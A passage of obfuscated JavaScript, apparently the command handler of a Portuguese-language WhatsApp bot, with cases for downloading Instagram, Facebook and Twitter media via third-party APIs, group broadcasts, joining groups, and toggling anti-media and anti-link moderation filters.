                  text: "📴",
                  key: _0x302296.key
                };
                const _0x3883bf = {
                  react: _0x329f6a
                };
                _0x263319.sendMessage(_0x4f1071, _0x3883bf);
              }
              break;
            case "playvideobotao":
              try {
                const _0x1fc374 = SITE_JEFF_APIS + "/api/dl/ytvideo2?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x3ee6ed = {
                  url: _0x1fc374
                };
                const _0x47c391 = {
                  video: _0x3ee6ed,
                  mimetype: "video/mp4"
                };
                const _0x4471a1 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x47c391, _0x4471a1);
                const _0x1f0074 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x377879 = {
                  react: _0x1f0074
                };
                _0x263319.sendMessage(_0x4f1071, _0x377879);
              } catch (_0x5bc1c1) {
                return _0x403602("Erro ao processar a solicitação. Tente novamente mais tarde.");
                const _0x58a707 = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x28559f = {
                  react: _0x58a707
                };
                _0x263319.sendMessage(_0x4f1071, _0x28559f);
              }
              break;
            case "instadw":
              if (!_0x1d6557.includes("instagram")) {
                return _0x403602("Ops, insira o link, só baixo vídeos / audios do " + _0x3dec88 + " com link");
              }
              if (!botoes_) {
                return _0x403602("𝐎𝐒 𝐁𝐎𝐓Õ𝐄𝐒 𝐄𝐒𝐓Ã𝐎 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐃𝐎, 𝐌𝐀𝐒 𝐏𝐀𝐑𝐀 𝐑𝐄𝐀𝐋𝐈𝐙𝐀𝐑 𝐎 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐃𝐄 𝐕𝐈𝐃𝐄𝐎\n\n𝙐𝙇𝙏𝙄𝙇𝙄𝙕𝙀: " + _0x1d93be + "insta_video " + _0x1d6557.trim() + " \n\n𝐉𝐀 𝐒𝐄 𝐐𝐔𝐈𝐒𝐄𝐑 𝐑𝐄𝐀𝐋𝐈𝐙𝐀𝐑 𝐎 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐃𝐄 Á𝐔𝐃𝐈𝐎,\n\n𝙐𝙇𝙏𝙄𝙇𝙄𝙕𝙀: " + _0x1d93be + "insta_audio " + _0x1d6557.trim());
              }
              EnvBotao(_0x4f1071, _0x32e455, _0x263319, "✔️ Download De Vídeo / Audio [ INSTAGRAM ]\nEscolha uma opção que deseja.", "☂️", "2|0", [_0x1d93be + "insta_video " + _0x1d6557, "🎥 Video", _0x1d93be + "insta_audio " + _0x1d6557, "🎵 Audio"], _0xa6b34);
              break;
            case "play_video2":
              try {
                if (!_0x1d6557) {
                  return _0x403602(_0x1d93be + _0x3dec88 + " link ou nome");
                }
                _0x403602(enviar.espere);
                const _0x2d3177 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  video: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/play_video?nome_url=" + _0x1d6557 + "&apikey=" + _0x44a335
                  },
                  mimetype: "video/mp4"
                }, _0x2d3177).catch(_0xd35e6b => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x870b74) {
                return _0x403602("Erro...");
              }
              break;
            case "facebook":
            case "face_video":
              try {
                if (!_0x1d6557.includes("www.facebook.com")) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link do Facebook");
                }
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link");
                }
                const _0x553b13 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x473c11 = {
                  react: _0x553b13
                };
                _0x263319.sendMessage(_0x4f1071, _0x473c11);
                _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/facebook2?url=" + _0x1d6557.trim() + "&apikey=" + _0x512d5e);
                const _0x1845a7 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x4785a1 = {
                  react: _0x1845a7
                };
                _0x263319.sendMessage(_0x4f1071, _0x4785a1);
                if (_0x105f0a.resultado && _0x105f0a.resultado.media.url.length > 1) {
                  const _0xe9ae6c = _0x105f0a.resultado.media.url;
                  const _0x5cebf2 = {
                    url: _0xe9ae6c
                  };
                  const _0x568470 = {
                    video: _0x5cebf2,
                    mimetype: "video/mp4",
                    caption: "Olá *" + _0x55a6ac + "*, aqui está o vídeo"
                  };
                  const _0x4a47a9 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x568470, _0x4a47a9);
                }
              } catch (_0x44c7cb) {
                const _0x527549 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x4875d7 = {
                  react: _0x527549
                };
                _0x263319.sendMessage(_0x4f1071, _0x4875d7);
                return _0x403602("" + infoerror);
              }
              break;
            case "face_audio":
              try {
                if (!_0x1d6557.includes("www.facebook.com")) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link do Facebook");
                }
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link");
                }
                const _0x259c58 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x3ebec6 = {
                  react: _0x259c58
                };
                _0x263319.sendMessage(_0x4f1071, _0x3ebec6);
                _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/facebook2?url=" + _0x1d6557.trim() + "&apikey=" + _0x512d5e);
                const _0x34fe0a = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x37f8b9 = {
                  react: _0x34fe0a
                };
                _0x263319.sendMessage(_0x4f1071, _0x37f8b9);
                if (_0x105f0a.resultado && _0x105f0a.resultado.media.url.length > 1) {
                  const _0x15c3fc = _0x105f0a.resultado.media.url;
                  const _0x2c2873 = {
                    url: _0x15c3fc
                  };
                  const _0xacce5d = {
                    audio: _0x2c2873,
                    mimetype: "audio/mpeg"
                  };
                  const _0x30b7fe = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0xacce5d, _0x30b7fe);
                }
              } catch (_0x3d0e4c) {
                const _0x112a09 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x5d7129 = {
                  react: _0x112a09
                };
                _0x263319.sendMessage(_0x4f1071, _0x5d7129);
                return _0x403602("" + infoerror);
              }
              break;
            case "twitter_video":
              try {
                if (!_0x1d6557.includes("twitter")) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link do Twitter");
                }
                _0x403602(enviar.espere);
                _0x263319.sendMessage(_0x4f1071, {
                  video: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/" + _0x3dec88 + "?url=" + _0x1d6557 + "&apikey=" + _0x44a335
                  },
                  mimetype: "video/mp4"
                }).catch(_0x55f450 => {
                  return _0x403602(String(_0x55f450));
                });
              } catch (_0x348715) {
                const _0x44b78a = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x44703c = {
                  react: _0x44b78a
                };
                _0x263319.sendMessage(_0x4f1071, _0x44703c);
                return _0x403602("" + infoerror);
              }
              break;
            case "twitter_audio":
              try {
                if (!_0x1d6557.includes("twitter")) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link do Twitter");
                }
                _0x403602(enviar.espere);
                _0x263319.sendMessage(_0x4f1071, {
                  audio: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/" + _0x3dec88 + "?url=" + _0x1d6557 + "&apikey=" + _0x44a335
                  },
                  mimetype: "audio/mp4"
                }).catch(_0x34e226 => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x411001) {
                const _0x4022c9 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x4be3ba = {
                  react: _0x4022c9
                };
                _0x263319.sendMessage(_0x4f1071, _0x4be3ba);
                return _0x403602("" + infoerror);
              }
              break;
            case "instagram":
            case "insta_video":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link");
                }
                if (!_0x1d6557.includes("instagram")) {
                  return _0x403602("Ops, insira o link, só baixo vídeos / audios do " + _0x3dec88 + " com link");
                }
                const _0x230183 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x2f8270 = {
                  react: _0x230183
                };
                _0x263319.sendMessage(_0x4f1071, _0x2f8270);
                const _0xd0accc = fetchJson(SITE_JEFF_APIS + "/api/instagram?url=" + _0x1d6557.trim() + "&apikey=" + _0x512d5e);
                _0xd0accc.then(async _0x59ac7b => {
                  if (_0x59ac7b.resultado) {
                    const _0x2f1dec = _0x59ac7b.resultado;
                    const _0x2fbf09 = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x3d3e10 = {
                      react: _0x2fbf09
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x3d3e10);
                    const _0xf6f1f9 = {
                      url: _0x2f1dec
                    };
                    const _0x527f00 = {
                      video: _0xf6f1f9,
                      mimetype: "video/mp4",
                      caption: ""
                    };
                    const _0x22a53a = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x527f00, _0x22a53a);
                  }
                }).catch(_0xcb1fc6 => {
                  console.error(_0xcb1fc6);
                  const _0x172aeb = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x45dafc = {
                    react: _0x172aeb
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x45dafc);
                  _0x403602("Erro ao processar o vídeo. Por favor, tente novamente mais tarde.");
                });
              } catch (_0x1ca0f7) {
                console.error(_0x1ca0f7);
                const _0x23692e = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x2174fe = {
                  react: _0x23692e
                };
                _0x263319.sendMessage(_0x4f1071, _0x2174fe);
                _0x403602("Erro ao processar o vídeo. Por favor, tente novamente mais tarde.");
              }
              break;
            case "instagram2":
            case "insta_video2":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link");
                }
                if (!_0x1d6557.includes("instagram")) {
                  return _0x403602("Ops, insira o link, só baixo vídeos / áudios do " + _0x3dec88 + " com link");
                }
                const _0x163fec = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x5cf15d = {
                  react: _0x163fec
                };
                _0x263319.sendMessage(_0x4f1071, _0x5cf15d);
                const _0x149c11 = fetchJson(SITE_JEFF_APIS + "/api/v2/instagram?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                _0x149c11.then(async _0x58caf6 => {
                  if (_0x58caf6.resultado && _0x58caf6.resultado.length > 0) {
                    const _0x56f88b = _0x58caf6.resultado[0].url;
                    const _0xf2519d = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x260ffe = {
                      react: _0xf2519d
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x260ffe);
                    const _0x288de5 = {
                      url: _0x56f88b
                    };
                    const _0xe02d82 = {
                      video: _0x288de5,
                      mimetype: "video/mp4",
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0xe02d82);
                  } else {
                    throw new Error("Nenhum resultado encontrado.");
                  }
                }).catch(_0x28cff1 => {
                  console.error(_0x28cff1);
                  const _0x3d067e = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x38201f = {
                    react: _0x3d067e
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x38201f);
                  _0x403602("Erro ao processar o vídeo. Por favor, tente novamente mais tarde.");
                });
              } catch (_0x42aa9e) {
                console.error(_0x42aa9e);
                const _0x125bf8 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x23e474 = {
                  react: _0x125bf8
                };
                _0x263319.sendMessage(_0x4f1071, _0x23e474);
                _0x403602("Erro ao processar o vídeo. Por favor, tente novamente mais tarde.");
              }
              break;
            case "insta_audio2":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link");
                }
                if (!_0x1d6557.includes("instagram")) {
                  return _0x403602("Ops, insira o link, só baixo vídeos / áudios do " + _0x3dec88 + " com link");
                }
                const _0x510ac7 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x23518a = {
                  react: _0x510ac7
                };
                _0x263319.sendMessage(_0x4f1071, _0x23518a);
                const _0x36c6cd = fetchJson(SITE_JEFF_APIS + "/api/v2/instagram?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                _0x36c6cd.then(async _0x1dd621 => {
                  if (_0x1dd621.resultado && _0x1dd621.resultado.length > 0) {
                    const _0x1b20e7 = _0x1dd621.resultado[0].url;
                    const _0x43fafc = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x253d50 = {
                      react: _0x43fafc
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x253d50);
                    const _0x37f894 = {
                      url: _0x1b20e7
                    };
                    const _0x1b7363 = {
                      audio: _0x37f894,
                      mimetype: "audio/mpeg",
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x1b7363);
                  } else {
                    throw new Error("Nenhum resultado encontrado.");
                  }
                }).catch(_0x24eb8c => {
                  console.error(_0x24eb8c);
                  const _0x5d8fe3 = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x1381e9 = {
                    react: _0x5d8fe3
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x1381e9);
                  _0x403602("Erro ao processar o vídeo. Por favor, tente novamente mais tarde.");
                });
              } catch (_0x3188c3) {
                console.error(_0x3188c3);
                const _0x2fa58e = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x1858c6 = {
                  react: _0x2fa58e
                };
                _0x263319.sendMessage(_0x4f1071, _0x1858c6);
                _0x403602("Erro ao processar o vídeo. Por favor, tente novamente mais tarde.");
              }
              break;
            case "insta_audio":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " o link");
                }
                if (!_0x1d6557.includes("instagram")) {
                  return _0x403602("Ops, insira o link, " + (_0x1d93be + _0x3dec88) + " com link");
                }
                const _0x21bc62 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x325eda = {
                  react: _0x21bc62
                };
                _0x263319.sendMessage(_0x4f1071, _0x325eda);
                const _0x5a39be = fetchJson(SITE_JEFF_APIS + "/api/instagram?url=" + _0x1d6557.trim() + "&apikey=" + _0x512d5e);
                _0x5a39be.then(async _0x33708f => {
                  if (_0x33708f.resultado) {
                    const _0xf8651a = _0x33708f.resultado;
                    const _0x260f56 = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x353448 = {
                      react: _0x260f56
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x353448);
                    const _0x2a2584 = {
                      url: _0xf8651a
                    };
                    const _0x28138a = {
                      audio: _0x2a2584,
                      mimetype: "audio/mp4",
                      caption: "Ola *" + _0x55a6ac + "* Aqui esta o vídeo!"
                    };
                    const _0x553481 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x28138a, _0x553481);
                  }
                }).catch(_0x160aa3 => {
                  console.error(_0x160aa3);
                  const _0x325120 = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x37d1a2 = {
                    react: _0x325120
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x37d1a2);
                  _0x403602("Erro ao processar o áudio. Por favor, tente novamente mais tarde.");
                });
              } catch (_0x323f85) {
                console.error(_0x323f85);
                const _0x575223 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x47039e = {
                  react: _0x575223
                };
                _0x263319.sendMessage(_0x4f1071, _0x47039e);
                _0x403602("Erro ao processar o áudio. Por favor, tente novamente mais tarde.");
              }
              break;
            case "signo":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Digite seu signo, exemplo: " + (_0x1d93be + _0x3dec88) + " virgem");
                }
                _0x403602(enviar.espere);
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/horoscopo?signo=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x29506a = {
                  url: ABC.resultado.imagem
                };
                const _0x369f00 = {
                  image: _0x29506a,
                  caption: "Signo: " + _0x1d6557 + "\n\n" + ABC.resultado.título + "\n" + ABC.resultado.inform
                };
                _0x263319.sendMessage(_0x4f1071, _0x369f00).catch(_0x121f85 => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x1ee222) {
                return _0x403602("" + infoerror);
              }
              break;
            case "bc":
            case "bcgroup":
            case "transmitir":
            case "transmissão":
              {
                if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x1d6557) {
                  return _0x403602("Texto onde?\n\nExemplo : " + (_0x1d93be + _0x3dec88) + " BOA VISTA ");
                }
                let _0x32b72e = await _0x263319.groupFetchAllParticipating();
                let _0x441a99 = Object.entries(_0x32b72e).slice(0).map(_0x152060 => _0x152060[1]);
                let _0x5da476 = _0x441a99.map(_0x13c72e => _0x13c72e.id);
                for (_0xc3d45a = 0; _0xc3d45a < _0x5da476.length; _0xc3d45a++) {
                  await sleep(1500);
                  let _0x439b1a = "「 TRANSMISSÃO DO BOT 」\n\n " + _0x1d6557;
                  const _0x2079f0 = {
                    text: _0x439b1a
                  };
                  _0x263319.sendMessage(_0x5da476[_0xc3d45a], _0x2079f0);
                }
                _0x403602("Enviando com sucesso ");
              }
              break;
            case "celular":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " galaxy a9 2018");
                }
                _0x403602(enviar.espere);
                const _0x1a086f = await fetchJson(SITE_JEFF_APIS + "/api/info_celular?celular=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                if (_0x1a086f.status && _0x1a086f.resultado) {
                  const _0x4c442b = _0x1a086f.resultado;
                  _0x403602("📱 Celular: " + _0x4c442b.nomeCelular + "\n\nInformações:\n" + (_0x4c442b.informações || _0x4c442b.resumoExtra));
                } else {
                  _0x403602("Celular não encontrado. Por favor, seja mais específico.");
                }
              } catch (_0x27b5f4) {
                return _0x403602("Erro ao obter informações do celular.");
              }
              break;
            case "join":
            case "entrar":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              let _0x5533ba = _0x40e45c.join(" ");
              if (!_0x5533ba) {
                return _0x403602("Insira um link de convite ao lado do comando.");
              }
              if (_0x5533ba.includes("chat.whatsapp.com/")) {
                _0x5533ba = _0x5533ba.split("chat.whatsapp.com/")[1];
                try {
                  await _0x263319.groupAcceptInvite(_0x5533ba);
                  _0x403602("entrei no grupo mestre");
                } catch (_0x481cb5) {
                  if (String(_0x481cb5).includes("resource-limit")) {
                    _0x403602("O grupo já está com o alcance máximo de 257 membros.");
                  } else if (String(_0x481cb5).includes("not-authorized")) {
                    _0x403602("Não foi possível entrar no grupo. Motivo: Banimento.");
                  } else {
                    console.error("Erro ao entrar no grupo:", _0x481cb5);
                    _0x403602("Ocorreu um erro ao tentar entrar no grupo. Por favor, tente novamente mais tarde.");
                  }
                }
              } else {
                _0x403602("Ops, verifique o link que você inseriu.");
              }
              break;
            case "antiimg":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Hmmmm");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x416e68) {
                  return _0x403602("Já Esta ativo");
                }
                _0x3bd584[0].antiimg = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de anti imagem neste grupo✔️");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x416e68) {
                  return _0x403602("Ja esta Desativado.");
                }
                _0x3bd584[0].antiimg = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativou com sucesso o recurso de anti imagem neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antivideo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Hmmmm");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x53df47) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antivideo = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de anti video neste grupo✔️");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x53df47) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antivideo = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativou com sucesso o recurso de anti video neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antiaudio":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Hmmmm");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0xb6a765) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antiaudio = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de anti audio neste grupo✔️");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0xb6a765) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antiaudio = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativou com sucesso o recurso de anti audio neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antisticker":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Hmmmm");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x4233ab) {
                  return _0x403602("Já Esta ativo");
                }
                _0x3bd584[0].antisticker = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de anti sticker neste grupo✔️");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x4233ab) {
                  return _0x403602("Ja esta Desativado.");
                }
                _0x3bd584[0].antisticker = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativou com sucesso o recurso de anti sticker neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antidocumento":
            case "antidoc":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x367ec0) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antidoc = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de anti documento neste grupo✔️");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x367ec0) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antidoc = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de anti documento neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antictt":
            case "anticontato":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x399715) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antictt = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de anticontato neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x399715) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antictt = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de anticontato neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antiloc":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              try {
                if (_0x40e45c.length < 1) {
                  return _0x403602("1 pra ativar, 0 pra desligar");
                }
                if (Number(_0x40e45c[0]) === 1) {
                  if (_0x51863c) {
                    return _0x403602("Já está Ativo.");
                  }
                  _0x3bd584[0].antiloc = true;
                  _0x33e29e(_0x3bd584);
                  _0x403602("Ativou com sucesso o recurso de anti loc neste grupo✔️");
                } else if (Number(_0x40e45c[0]) === 0) {
                  if (!_0x51863c) {
                    return _0x403602("Já está Desativado.");
                  }
                  _0x3bd584[0].antiloc = false;
                  _0x33e29e(_0x3bd584);
                  _0x403602("Desativou com sucesso o recurso de anti loc neste grupo✔️");
                } else {
                  _0x403602("1 para ativar, 0 para desativar");
                }
              } catch {
                _0x403602("Deu erro, tente novamente :/");
              }
              break;
            case "antilinkgp":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x44ddae) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antilinkgp = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de antilinkgp 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x44ddae) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antilinkgp = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de antilink de grupo ✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antilinkhard":
            case "antilink":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x51b3b7) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antilinkhard = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de antilink hardcore neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x51b3b7) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antilinkhard = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de antilink harcore neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "x9":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0xec937a) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].x9 = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de x9 neste grupo, irei notificar quando alguém for Rebaixado ou promovido a adm 😏..");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0xec937a) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].x9 = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de x9 neste grupo, não irei mais notificar promoção de adm nem rebaixamento..✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "visualizarmsg":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x5b41aa) {
                nescessario.visualizarmsg = true;
                _0x130557(nescessario);
                _0x403602("🌀 Ativou com sucesso o recurso de visualizar todas as mensagens enviada em grupos e privado 📝");
              } else if (_0x5b41aa) {
                nescessario.visualizarmsg = false;
                _0x130557(nescessario);
                _0x403602("‼️ Desativou com sucesso o recurso de visualizar todas as mensagens enviada em grupos e privado✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "gold":
            case "golds":
            case "consultargold":
              if (!_0x3fb600) {
                return _0x403602("Só é possível utilizar este comando ativando o sistema de Golds\nExemplo: " + _0x1d93be + "sistemgold 1");
              }
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (_0x3dec88 == "consultargold") {
                _0x1c8207(_0x1dcf0a);
              } else {
                _0x1c8207(_0x32e455);
              }
              break;
            case "rankgold":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
